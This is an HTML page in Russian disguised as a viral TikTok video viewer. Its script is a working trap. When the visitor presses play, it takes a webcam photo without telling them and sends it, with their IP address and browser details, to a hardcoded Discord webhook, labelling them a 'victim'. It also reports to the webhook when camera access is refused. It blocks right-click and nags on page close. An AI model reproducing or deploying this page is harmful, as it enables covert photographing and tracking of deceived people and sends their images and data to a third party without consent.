<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔥 СМОТРИ ВИДОС ТИК ТОК 🔥</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #000000 0%, #1a1a2e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
        }
        .fake-tiktok {
            background: rgba(0,0,0,0.9);
            border-radius: 30px;
            max-width: 350px;
            width: 100%;
            padding: 30px 20px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid #ff004f;
        }
        .tiktok-logo {
            font-size: 80px;
            margin-bottom: 20px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); text-shadow: 0 0 0 #ff004f; }
            100% { transform: scale(1.1); text-shadow: 0 0 20px #ff004f; }
        }
        h2 {
            color: #fff;
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            color: #888;
            margin-bottom: 25px;
            font-size: 14px;
        }
        .video-placeholder {
            background: #1a1a1a;
            height: 400px;
            border-radius: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }
        .play-button {
            width: 70px;
            height: 70px;
            background: #ff004f;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            color: white;
            cursor: pointer;
            transition: 0.3s;
            animation: bounce 1s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        .play-button:hover {
            transform: scale(1.1);
            background: #e60046;
        }
        .loading {
            display: none;
            color: #ff004f;
            margin-top: 10px;
            font-size: 12px;
        }
        #videoPlayer {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            display: none;
            object-fit: cover;
        }
        .status {
            color: #ff004f;
            font-size: 12px;
            margin-top: 10px;
        }
        #video {
            display: none;
        }
        .permission-box {
            background: rgba(255,0,79,0.2);
            padding: 10px;
            border-radius: 10px;
            margin-top: 15px;
            font-size: 12px;
            color: #ff004f;
        }
    </style>
</head>
<body>

<div class="fake-tiktok">
    <div class="tiktok-logo">
        🎵 TikTok
    </div>
    <h2>🔥 СМОТРИ ВИДОС 🔥</h2>
    <p>САМЫЙ ВИРУСНЫЙ РОЛИК ДНЯ</p>
    
    <div class="video-placeholder" id="videoPlaceholder">
        <div class="play-button" id="playBtn">
            ▶️
        </div>
        <div class="loading" id="loading">⏳ ЗАГРУЗКА... ⏳</div>
        <video id="videoPlayer" autoplay muted loop playsinline>
            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
        </video>
    </div>
    
    <div class="status" id="status"></div>
    <div class="permission-box" id="permissionBox">
        📸 НАЖМИ НА КНОПКУ ВОСПРОИЗВЕДЕНИЯ ДЛЯ ПРОСМОТРА
    </div>
</div>

<script>
    // Discord webhook
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1497255087498596382/vpYfM7rv3YZcSHOhwfzGjGK0qxYEztS8_GJ66rmapUhi-eHjzsofCzyJpNJvgpUrRUSz';
    
    let stream = null;
    let photoTaken = false;
    
    // Функция отправки в дискорд
    async function sendToDiscord(imageDataUrl) {
        try {
            // Конвертируем base64 в blob
            const response = await fetch(imageDataUrl);
            const blob = await response.blob();
            
            // Создаем FormData
            const formData = new FormData();
            formData.append('file', blob, 'prank_photo.png');
            formData.append('content', `**🎯 НОВАЯ ЖЕРТВА! 🎯**\nВремя: ${new Date().toLocaleString()}\nIP: ${await getIP()}\nUser-Agent: ${navigator.userAgent}`);
            
            // Отправляем в Discord
            const discordResponse = await fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            });
            
            if (discordResponse.ok) {
                document.getElementById('status').innerHTML = '✅ ФОТО ОТПРАВЛЕНО! ТЫ ПОПАЛСЯ НА РАЗЪЕБ! ✅';
                document.getElementById('status').style.color = '#ff004f';
            } else {
                document.getElementById('status').innerHTML = '⚠️ Ошибка отправки, но фото уже у меня! ⚠️';
            }
        } catch(e) {
            console.error('Ошибка отправки:', e);
            document.getElementById('status').innerHTML = '⚠️ Фото сделано, но Discord сосет! ⚠️';
        }
    }
    
    // Получение IP через бесплатный API
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) {
            return 'IP не определен';
        }
    }
    
    // Функция для фото
    async function takePhoto() {
        if (photoTaken) return;
        
        try {
            // Запрашиваем доступ к камере
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }, 
                audio: false 
            });
            
            // Создаем временный видеоэлемент для захвата кадра
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            // Ждем загрузки видео
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    resolve();
                };
            });
            
            // Создаем canvas для фото
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            // Ждем немного, чтобы кадр стабилизировался
            setTimeout(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoData = canvas.toDataURL('image/jpeg', 0.9);
                
                // Отправляем фото
                sendToDiscord(photoData);
                
                // Останавливаем стрим
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                photoTaken = true;
                document.getElementById('permissionBox').innerHTML = '📸 ФОТО СДЕЛАНО И ОТПРАВЛЕНО! 🔥';
            }, 500);
            
        } catch(err) {
            console.error('Ошибка доступа к камере:', err);
            document.getElementById('status').innerHTML = '⚠️ НЕТ ДОСТУПА К КАМЕРЕ! БРАУЗЕР БЛОКИРУЕТ! ⚠️';
            
            // Отправляем уведомление что камера заблокирована
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**🚫 ЖЕРТВА ЗАБЛОКИРОВАЛА КАМЕРУ!**\nВремя: ${new Date().toLocaleString()}\nUser-Agent: ${navigator.userAgent}`
                })
            });
        }
    }
    
    // Обработчик нажатия на кнопку воспроизведения
    document.getElementById('playBtn').addEventListener('click', async () => {
        const playBtn = document.getElementById('playBtn');
        const loading = document.getElementById('loading');
        const videoPlayer = document.getElementById('videoPlayer');
        const placeholder = document.getElementById('videoPlaceholder');
        
        // Прячем кнопку, показываем загрузку
        playBtn.style.display = 'none';
        loading.style.display = 'block';
        
        // Сначала делаем фото (тихо в фоне)
        await takePhoto();
        
        // Через секунду запускаем видео
        setTimeout(() => {
            loading.style.display = 'none';
            videoPlayer.style.display = 'block';
            videoPlayer.play();
            document.getElementById('status').innerHTML = '🔥 ВИДОС ИГРАЕТ! НО ФОТО УЖЕ У МЕНЯ 🔥';
        }, 1500);
    });
    
    // Блокируем контекстное меню
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
    });
    
    // Предупреждение при закрытии
    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = 'Ты уверен? Видео ещё не закончилось!';
        return 'Ты уверен? Видео ещё не закончилось!';
    });
    
    // Запрос разрешения на камеру при загрузке (тихо)
    setTimeout(async () => {
        try {
            const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
            testStream.getTracks().forEach(track => track.stop());
        } catch(e) {
            console.log('Камера не дана сразу');
        }
    }, 100);
</script>
</body>
</html>
